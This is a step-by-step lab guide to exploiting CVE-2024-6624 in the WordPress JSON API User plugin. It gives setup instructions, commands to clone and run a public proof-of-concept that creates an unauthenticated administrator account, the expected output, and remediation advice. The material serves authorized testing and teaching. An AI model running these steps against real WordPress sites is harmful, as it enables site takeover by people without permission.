# script-for-Unauthenticated-admin-creation-in-wordpress-using-JSON-API-PLUGIN-JSON-USER-API-PLUGIN
CVE-2024-6624 – JSON API User Plugin Unauthenticated Admin Creation
📖 Overview
This document provides a step‑by‑step guide to exploiting CVE-2024-6624, a critical vulnerability in the JSON API User plugin for WordPress (versions ≤ 3.9.3). An unauthenticated attacker can:

Register a new user account (even if user registration is disabled).

Promote that user to Administrator – achieving full site takeover.

Affected plugin: JSON API User ≤ 3.9.3 (requires base JSON API plugin).
CVSS Score: 9.8 (Critical)
Patch status: Update to version 3.9.4 or remove the plugin.

🧪 Lab Environment Setup
We assume you have two VMs:

Target: Windows VM with WordPress running at http://192.168.56.104/wordpress

Attacker: Kali Linux (or any Linux with Python 3)

1. Install WordPress on Windows VM
If not already installed, use XAMPP/WAMP. The exact steps are not covered here – you already have a working WordPress instance.

2. Install Required Plugins on Target
Two plugins must be installed and activated:

Plugin	Version	Purpose
JSON API (base)	latest from GitHub	Provides REST API infrastructure
JSON API User	3.9.3 (vulnerable)	Adds user registration/update endpoints
🔹 Download & Install JSON API (Base Plugin)
Since the plugin was removed from WordPress.org, download it from GitHub:

On your Windows VM, download the ZIP archive:
https://github.com/PI-Media/json-api/archive/refs/heads/master.zip

Use browser or PowerShell:

powershell
Invoke-WebRequest -Uri "https://github.com/PI-Media/json-api/archive/refs/heads/master.zip" -OutFile "json-api-master.zip"
Extract the ZIP, rename the folder from json-api-master to json-api.

Re‑zip the folder as json-api.zip.

In WordPress admin (http://192.168.56.104/wordpress/wp-admin), go to Plugins → Add New → Upload Plugin, select json-api.zip, click Install Now, then Activate.

🔹 Download & Install JSON API User (Vulnerable)
From your target VM, download the plugin from the official WordPress repository (the vulnerable version is still available in the Advanced view).
Direct link for version 3.9.3:
https://downloads.wordpress.org/plugin/json-api-user.3.9.3.zip

In WordPress admin, go to Plugins → Add New → Upload Plugin, select the downloaded ZIP, install, and activate.

🔹 Enable the User Controller
After activation, you need to enable the User controller:

In WordPress admin, go to Settings → JSON API.

Look for User in the list of controllers, check the box next to it, and click Save Changes.

🔹 Enable User Registration (Temporarily)
WordPress requires open registration for the exploit to create a user. Enable it:

Go to Settings → General.

Check Anyone can register.

Set New User Default Role to Subscriber (security best practice).

Click Save Changes.

Note: The exploit works even if registration is disabled in WordPress (by bypassing the setting), but the script we use expects it enabled. For simplicity, we turn it on.

💻 Attacker Machine Setup (Kali Linux)
Install Python 3 and requests (if not already):

bash
sudo apt update
sudo apt install python3 python3-pip
pip3 install requests
Download the exploit script from the official PoC repository:

bash
git clone https://github.com/RandomRobbieBF/CVE-2024-6624.git
cd CVE-2024-6624
Make the script executable (optional):

bash
chmod +x CVE-2024-6624.py
🚀 Running the Exploit
From your Kali terminal, execute the script with these parameters:

bash
python3 CVE-2024-6624.py -u http://192.168.56.104/wordpress -un myadmin -p MyPass123
Parameter explanation:

-u : Base URL of your WordPress installation (no trailing slash)

-un: Username for the new admin account (choose anything)

-p : Password for the new admin account

Expected output (success)
text
[+] Registration successful: {'user_id': 42, 'cookie': '...'}
[+] User 'myadmin' successfully promoted to Administrator!
[+] Login at: http://192.168.56.104/wordpress/wp-login.php
If you see User registration is disabled
You forgot to enable Anyone can register in WordPress Settings → General.

If you see Unknown controller 'user'
The User controller is not activated. Go to Settings → JSON API and enable it.

If you see SSL is not enabled...
The script already handles this with insecure=cool. If using a custom script, add 'insecure': 'cool' to registration and promotion requests.

✅ Verification
Open a browser and go to http://192.168.56.104/wordpress/wp-login.php.

Log in with myadmin / MyPass123.

You should see the WordPress admin dashboard, confirming administrator privileges.

🧹 Cleanup (After Testing)
Remove the created admin account and disable the plugins:

Log in as a real administrator (not the backdoor account).

Go to Users → All Users, delete the myadmin user (or the username you created).

Deactivate and delete both JSON API and JSON API User plugins.

Re‑disable Anyone can register in Settings → General.

🛡️ Remediation for Production Sites
Update JSON API User to version 3.9.4 or later.

If the plugin is not essential, deactivate and delete it.

Disable user registration if not needed.

Block the API endpoint at web server level:

apache
# Apache .htaccess
RewriteCond %{REQUEST_URI} ^/wp-json/(json-api|user)/ [NC,OR]
RewriteRule .* - [F]
Monitor logs for requests containing /api/user/register/ or /api/user/update_user_meta/.

📚 References
Original PoC by RandomRobbieBF

JSON API base plugin (GitHub)

NVD Entry – CVE-2024-6624 (once published)

⚠️ Legal Disclaimer
This guide and the accompanying tools are provided for educational and authorized security testing only.
Never use them against systems you do not own or have explicit written permission to test.
The author assumes no liability for misuse or damage caused by this information.
